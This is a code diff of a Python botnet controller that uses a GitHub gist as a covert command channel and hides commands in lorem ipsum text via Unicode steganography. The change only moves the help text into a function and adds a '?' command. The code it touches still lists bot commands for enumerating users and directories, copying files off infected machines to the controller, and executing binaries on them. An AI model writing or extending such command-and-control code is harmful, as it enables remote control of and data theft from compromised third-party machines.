@@ -4,13 +4,15 @@ from github import Github
 import pyUnicodeSteganography as usteg
 import lorem
 
-print(f"Hello, welcome to the bot controller. Possible commands are:\n\
-    onl - get the number of online bots\n \
-    w - get listing of currently logged users\n \
-    ls <path> - get a listing of a paritcular directory\n \
-    id - get id of current user\n \
-    cp <full_path_to_the_file> - copy a file from bot to the controller\n \
-    ex <full_path_to_the_binary>\n\n")
+def print_help():
+    print(f"Hello, welcome to the bot controller. Possible commands are:\n\
+        onl - get the number of online bots\n \
+        w - get listing of currently logged users\n \
+        ls <path> - get a listing of a paritcular directory\n \
+        id - get id of current user\n \
+        cp <full_path_to_the_file> - copy a file from bot to the controller\n \
+        ex <full_path_to_the_binary>\n\n")
+print_help()
 
 g = Github("") # INSERT YOUR TOKEN HERE
 gist = g.get_gist('16f8ed1319b10a550451060d5a56d493')
@@ -41,6 +43,8 @@ def send_command(args):
         gist.create_comment(command_enc)
     elif args[0] == "onl":
         print("Number of Bots online:", no_of_online_bots)
+    elif args[0] == "?":
+        print_help()
     else:
         print("Sorry unknown command or incorrect number of arguments")
 
